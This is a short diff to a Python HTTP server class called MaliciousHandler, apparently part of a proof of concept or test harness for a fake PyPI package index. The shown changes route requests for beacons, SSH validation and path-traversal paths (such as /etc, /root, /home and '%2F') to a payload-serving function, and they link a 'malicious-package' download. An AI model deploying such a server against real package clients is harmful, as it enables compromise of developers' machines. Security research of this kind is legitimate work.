@@ -134,9 +134,14 @@ class MaliciousHandler(http.server.BaseHTTPRequestHandler):
             self.handle_beacon(query)
         elif '/validate/ssh' in path:
             self.validate_ssh()
-        else:
+        elif path.startswith('/simple/'):
+            # Unknown package - return empty page
+            self.send_html('<html><body></body></html>')
+        elif '%2F' in path or path.startswith('/etc') or path.startswith('/root') or path.startswith('/home'):
             # This is the path traversal payload delivery
             self.serve_payload()
+        else:
+            self.send_error(404)
 
     def serve_index(self):
         """PyPI simple index."""
@@ -150,7 +155,7 @@ class MaliciousHandler(http.server.BaseHTTPRequestHandler):
         """Package download links."""
         html = '''<!DOCTYPE html>
 <html><body>
-<a href="/packages/malicious-package-1.0.tar.gz#md5=abc123">malicious-package-1.0.tar.gz</a>
+<a href="/packages/malicious-package-1.0.tar.gz">malicious-package-1.0.tar.gz</a>
 </body></html>'''
         self.send_html(html)
         print("[SERVER] Served package page")
